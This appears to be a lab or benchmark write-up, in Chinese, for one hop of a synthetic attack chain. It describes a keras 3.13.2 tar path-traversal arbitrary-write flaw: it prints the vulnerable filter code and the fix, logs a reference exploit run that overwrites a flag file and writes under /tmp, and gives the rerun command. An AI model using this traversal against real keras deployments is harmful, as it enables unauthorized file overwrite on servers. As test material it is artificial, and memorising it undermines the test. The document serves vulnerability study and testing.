# Hop 5 — keras 3.13.2 路径穿越任意写 (CVE-2026-11816)

日期:2026-11-20。状态:**G1 双版本验证 PASS**(3.13.2 exit 0 / 3.14.0 exit 2)。

## 真实漏洞代码(官方 wheel,容器内已核实)

`keras/src/utils/file_utils.py`(3.13.2 官方 wheel):

```python
def filter_safe_tarinfos(members, …):
    base_dir = resolve_path(".")                     # ← 以 CWD 为界,不是解压目标目录
    …
def is_path_in_dir(path, base_dir):
    return resolve_path(os.path.join(base_dir, path)).startswith(base_dir)
```

容器内 `CWD=/`(root 运行、WORKDIR 未设,现实部署常见形态)→ `base_dir = "/"` → tar 里任何绝对路径 member(`/etc/...`、`/tmp/...`)join 后 resolve 仍在 `/` 下 → `startswith("/")` 恒真 → **"安全过滤"放行绝对路径 member** → 任意文件写。

修复(3.14.0):base_dir 改为显式传入的解压目标目录(`filter_safe_tarinfos(archive, path)`),绝对路径 member resolve 后落在目标目录之外 → 被跳过。

## 场景声明(PLAN.md §3)

"机器 C 暴露 keras 预处理服务、接受模型归档上传并经 `keras.utils.extract_archive` 解压、且以 CWD=/ 运行"为**合成部署场景**。漏洞原语(CWD 界定的 tar 安全过滤)100% 来自官方 wheel。注意 3.13.2 的 `extract_archive` 不在 `keras.utils` 顶层导出,真实 import 路径为 `keras.src.utils.file_utils`(已核实两版本一致)。

## G1 双版本验证

| 版本 | wheel | 结果 |
|---|---|---|
| 3.13.2(受影响) | 官方 PyPI wheel + tensorflow-cpu 2.20.0(amd64) | exploit SUCCESS(exit 0):tar 内绝对路径 member 全部通过 filter → `/tmp/pwned-*` marker 写入 + `/etc/run-secrets/final_flag` 覆盖,经服务 `/debug` 读回验证 |
| 3.14.0(修复) | 官方 PyPI wheel | 同一 exploit FAIL(exit 2):`files: ['model/weights.npz']` —— 绝对路径 member 被跳过,marker 404,零写入 |

### 3.13.2 运行输出(2026-11-20)

```
[exploit] uploading crafted tar (10240 bytes) to http://keras-c:8080/load
[exploit] service response: {'files': ['model/weights.npz'], 'status': 'extracted', 'version': '3.13.2'}
[exploit] marker file content: b'pwned-by-hop5'
[exploit] flag file now: b'hop5-overwritten-flag'
[exploit] SUCCESS
exit=0
```

(注:`files` 列表只含相对路径 member,因为服务只 walk 解压目录;绝对路径 member 写在了目录外——这正是穿越写成立的证据。)

### 3.14.0 运行输出

```
[exploit] service response: {'files': ['model/weights.npz'], 'status': 'extracted', 'version': '3.14.0'}
[exploit] debug read error: HTTP Error 404: NOT FOUND
[exploit] FAIL: no traversal write (patched wheel?)
exit=2
```

## 运行记录

- 项目:`docker compose -p hop5-vuln`(host 17891)/ `-p hop5-fix`(17892),`platform: linux/amd64`(tensorflow-cpu 无 arm64 wheel)
- exploit:`attacker/reference_exploit.py`,退出码 0=穿越写+覆盖、2=被修(修复版预期)、4=仅 marker 未覆盖 flag
- 环境注意:服务需 CWD=/ 触发条件,Dockerfile 已设;`extract_archive` import 自 `keras.src.utils.file_utils`
- 战果口径:本跳 G1 验证的写原语 = "覆盖服务 C 可读的任意文件";链终局 flag(`/etc/run-secrets/final_flag`)设计为 per-run 注入,当前 build 用 exploit 覆盖证明写能力(G2 全链时由 checker 以字节比对接管)
- 复跑:`docker exec hop5_attacker_vuln python /app/reference_exploit.py http://keras-c:8080`
